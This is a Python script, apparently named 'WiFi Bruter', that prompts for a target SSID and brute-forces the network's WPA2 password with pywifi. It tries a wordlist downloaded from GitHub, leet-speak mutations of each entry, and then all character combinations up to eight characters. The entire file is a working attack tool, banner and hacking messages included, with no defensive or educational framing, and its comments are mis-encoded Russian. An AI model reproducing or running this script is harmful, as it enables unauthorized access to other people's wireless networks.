import itertools
import os
import requests
import random
import string
from pywifi import PyWiFi, const, Profile
import time
from colorama import init, Back, Fore, Style

# logo paste
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text, start_color, end_color):
    # —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–∞ HEX –≤ RGB
    def hex_to_rgb(hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    # –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ–º —Ü–≤–µ—Ç–∞ –∏–∑ HEX –≤ RGB
    start_rgb = hex_to_rgb(start_color)
    end_rgb = hex_to_rgb(end_color)

    # —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω—ã—Ö —Ü–≤–µ—Ç–æ–≤
    def interpolate_color(start_rgb, end_rgb, factor):
        return tuple(int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * factor) for i in range(3))

    # –¥–ª–∏–Ω–∞ —Ç–µ–∫—Å—Ç–∞
    length = len(text)

    # —Å–æ–∑–¥–∞–µ–º –≥—Ä–∞–¥–∏–µ–Ω—Ç–Ω—ã–π —Ç–µ–∫—Å—Ç
    gradient_text = ''
    for i, char in enumerate(text):
        factor = i / (length - 1)  # –∏—Å–ø–æ–ª—å–∑—É–µ–º length - 1 –¥–ª—è –ø–ª–∞–≤–Ω–æ–≥–æ –≥—Ä–∞–¥–∏–µ–Ω—Ç–∞
        color = interpolate_color(start_rgb, end_rgb, factor)
        gradient_text += f'[38;2;{color[0]};{color[1]};{color[2]}m{char}'
    gradient_text += '[0m'  # —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Ü–≤–µ—Ç

    return gradient_text

# —Ü–≤–µ—Ç–∞
start_color = "#ff7e93"
end_color = "#a200fa"

text = """

 ‚ñà     ‚ñà‚ñë ‚ñà‚ñà‚ñì  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì    ‚ñÑ‚ñÑ‚ñÑ‚ñÑ    ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñà    ‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà  
‚ñì‚ñà‚ñë ‚ñà ‚ñë‚ñà‚ñë‚ñì‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà   ‚ñí‚ñì‚ñà‚ñà‚ñí   ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí ‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñí‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñì‚ñà   ‚ñÄ ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí
‚ñí‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà ‚ñë‚ñí‚ñà‚ñà‚ñí   ‚ñí‚ñà‚ñà‚ñí ‚ñÑ‚ñà‚ñà‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñì‚ñà‚ñà  ‚ñí‚ñà‚ñà‚ñë‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà   ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí
‚ñë‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñë‚ñà‚ñà‚ñë‚ñë‚ñì‚ñà‚ñí  ‚ñë‚ñë‚ñà‚ñà‚ñë   ‚ñí‚ñà‚ñà‚ñë‚ñà‚ñÄ  ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñì‚ñà  ‚ñë‚ñà‚ñà‚ñë‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñí‚ñì‚ñà  ‚ñÑ ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  
‚ñë‚ñë‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì ‚ñë‚ñà‚ñà‚ñë‚ñë‚ñí‚ñà‚ñë   ‚ñë‚ñà‚ñà‚ñë   ‚ñë‚ñì‚ñà  ‚ñÄ‚ñà‚ñì‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì   ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí
‚ñë ‚ñì‚ñë‚ñí ‚ñí  ‚ñë‚ñì   ‚ñí ‚ñë   ‚ñë‚ñì     ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë‚ñí‚ñì‚ñí ‚ñí ‚ñí   ‚ñí ‚ñë‚ñë   ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë
  ‚ñí ‚ñë ‚ñë   ‚ñí ‚ñë ‚ñë      ‚ñí ‚ñë   ‚ñí‚ñë‚ñí   ‚ñë   ‚ñë‚ñí ‚ñë ‚ñí‚ñë‚ñë‚ñë‚ñí‚ñë ‚ñë ‚ñë     ‚ñë     ‚ñë ‚ñë  ‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë
  ‚ñë   ‚ñë   ‚ñí ‚ñë ‚ñë ‚ñë    ‚ñí ‚ñë    ‚ñë    ‚ñë   ‚ñë‚ñë   ‚ñë  ‚ñë‚ñë‚ñë ‚ñë ‚ñë   ‚ñë         ‚ñë     ‚ñë‚ñë   ‚ñë 
    ‚ñë     ‚ñë          ‚ñë      ‚ñë         ‚ñë        ‚ñë                 ‚ñë  ‚ñë   ‚ñë     
                                 ‚ñë                                            

"""

def load_passwords(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.text.splitlines()

def mutate_password(password):
    mutations = [
        (lambda s: s.replace('a', '@').replace('a', '4')),
        (lambda s: s.replace('e', '3').replace('E', '3')),
        (lambda s: s.replace('i', '1').replace('I', '1')),
        (lambda s: s.replace('o', '0').replace('O', '0')),
        (lambda s: s.upper()),
        (lambda s: s.lower())
    ]
    random.shuffle(mutations)
    for mutate in mutations:
        password = mutate(password)
    return password

def generate_combinations(length):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_+="
    for password in itertools.product(chars, repeat=length):
        yield ''.join(password)

def brute_force(ssid, password_list_url):
    passwords = load_passwords(password_list_url)

    for password in passwords:
        if try_password(ssid, password):
            return password
        mutated_password = mutate_password(password)
        if try_password(ssid, mutated_password):
            return mutated_password

    for length in range(1, 9):  # –ø—Ä–æ–±—É–π—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –¥–ª–∏–Ω–æ–π –¥–æ 8 —Å–∏–º–≤–æ–ª–æ–≤
        for password in generate_combinations(length):
            if try_password(ssid, password):
                return password

    return None


# –∑–∞–º–µ–Ω—è–π –∫–æ–≥–¥–∞ –Ω–∞–¥–æ!
def try_password(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)

    print(f"{Fore. YELLOW}Bruting: '{password}' in SSID '{ssid}'...")

    iface.connect(temp_profile)
    time.sleep(10)  # —É–≤–µ–ª–∏—á–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è

    if iface.status() == const.IFACE_CONNECTED:
        iface.disconnect()
        time.sleep(5)  # –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
        return True
    else:
        iface.disconnect()
        time.sleep(10)  # –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
        return False


def main():
    clear_console()
    print(gradient_text(text, start_color, end_color))
    ssid = input(f"{Fore. WHITE}Target SSID: ")
    password_list_url = 'https://raw.githubusercontent.com/zecopro/wpa-passwords/refs/heads/master/3wifi-wordlist.txt'
    password = brute_force(ssid, password_list_url)

    if password:
        print(f"{Fore. GREEN}{ssid}: Password Bruted!: {password}")
    else:
        print(f"{Fore. RED}Password too hard to bruteforce, can't hack {ssid}")

if __name__ == "__main__":
    main()
